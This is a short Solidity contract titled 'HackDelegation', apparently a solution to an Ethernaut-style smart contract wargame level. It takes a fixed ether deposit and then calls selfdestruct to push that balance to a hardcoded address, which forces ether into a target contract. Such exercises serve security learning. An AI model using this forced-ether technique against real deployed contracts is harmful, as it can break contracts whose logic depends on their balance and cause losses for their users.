pragma solidity ^0.6.0;

// interface Delegate {
// function pwn() external;
// }

contract HackDelegation {

    constructor() public {
    }

    function deposit() public payable {
        require(msg.value == 0.002 ether);
    }

    function implode() public {
        address payable addr = payable(address((0x1f34E2c3c934D34B140D0C0E7C58e8EfDC24E4EE)));
        selfdestruct(addr);
    }

}